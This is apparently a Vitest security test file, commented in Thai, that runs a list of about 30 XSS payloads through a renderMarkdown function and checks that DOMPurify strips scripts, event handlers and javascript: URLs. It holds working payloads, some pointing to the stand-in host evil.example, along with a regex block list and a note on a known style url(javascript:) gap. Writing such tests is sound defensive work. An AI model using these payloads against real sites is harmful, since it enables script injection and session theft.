// ยิง payload XSS ที่ใช้จริงผ่าน renderMarkdown (allowHtml = true แบบ st.markdown(unsafe_allow_html) ของหน้าเดิม)
// ผ่านเมื่อผลลัพธ์ไม่มีสคริปต์/handler/URL อันตรายเหลืออยู่ — Vite ไม่โหลด test นอก frontend/ จึงคัดลอกไปชั่วคราว (จาก frontend/):
//   mkdir .security-probe-tmp && sed 's#../../frontend/src/render/Markdown#../src/render/Markdown#' ../tools/security/xss.test.ts \
//     > .security-probe-tmp/xss.test.ts && npx vitest run .security-probe-tmp/xss.test.ts; rm -rf .security-probe-tmp
// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../../frontend/src/render/Markdown";

const PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<a href=\"javascript:alert(1)\">x</a>",
  "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
  "<a href=\"&#106;avascript:alert(1)\">x</a>",
  "<a href=\" javascript:alert(1)\">x</a>",
  "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
  "[x](javascript:alert(1))",
  "<iframe src=\"https://evil.example\"></iframe>",
  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
  "<object data=\"https://evil.example/x.swf\"></object>",
  "<embed src=\"https://evil.example\">",
  "<form action=\"https://evil.example\"><input name=p></form>",
  "<button formaction=\"https://evil.example\">x</button>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
  "<details open ontoggle=alert(1)>",
  "<body onload=alert(1)>",
  "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
  "<base href=\"https://evil.example/\">",
  "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">",
  "<style>@import url('https://evil.example/x.css');</style>",
  "<img src=\"https://evil.example/track.gif\">",
  "<template><script>alert(1)</script></template>",
  "<isindex action=javascript:alert(1) type=image>",
  "<video><source onerror=alert(1)></video>",
  "<input autofocus onfocus=alert(1)>",
];

const BAD = [/<script/i, /\son[a-z]+\s*=/i, /javascript:/i, /<iframe/i, /<object/i, /<embed/i, /<form/i, /<input/i,
             /<button/i, /<meta/i, /<base/i, /<link/i, /srcdoc/i, /formaction/i, /data:text\/html/i];

describe("XSS payloads ผ่าน renderMarkdown(allowHtml)", () => {
  for (const p of PAYLOADS) {
    it(p.slice(0, 60), () => {
      const out = renderMarkdown(p, true);
      for (const b of BAD) expect(out, `ยังมี ${b} ใน: ${out}`).not.toMatch(b);
    });
  }
  it("ข้อความจาก AI (allowHtml = false) ไม่กลายเป็น HTML", () => {
    const out = renderMarkdown("<img src=x onerror=alert(1)>", false);
    expect(out).not.toMatch(/<img/i);
  });
});

// style="url(javascript:...)" DOMPurify ปล่อยผ่าน แต่เบราว์เซอร์ปัจจุบันไม่รัน javascript: ใน CSS (เฉพาะ IE เก่า) และ CSP กันซ้ำ
it("style url(javascript:) ผ่าน DOMPurify (ทราบแล้ว ไม่รันใน browser ปัจจุบัน)", () => {
  expect(renderMarkdown('<div style="background:url(javascript:alert(1))">x</div>', true)).toMatch(/<div style=/);
});

// แสดงรายการที่ CSP ต้องช่วยกัน (DOMPurify ปล่อยผ่านโดยตั้งใจ): รูป/CSS จากโดเมนอื่น
describe("ข้อมูลประกอบ (ไม่ fail)", () => {
  it("รายการ URL ภายนอกที่หลุดจาก DOMPurify — CSP img-src/style-src ต้องกันต่อ", () => {
    const leaks = PAYLOADS.map((p) => [p, renderMarkdown(p, true)] as const).filter(([, o]) => /evil\.example/.test(o));
    console.log("external-url-after-sanitize:", JSON.stringify(leaks.map(([p, o]) => ({ p, o })), null, 1));
  });
});
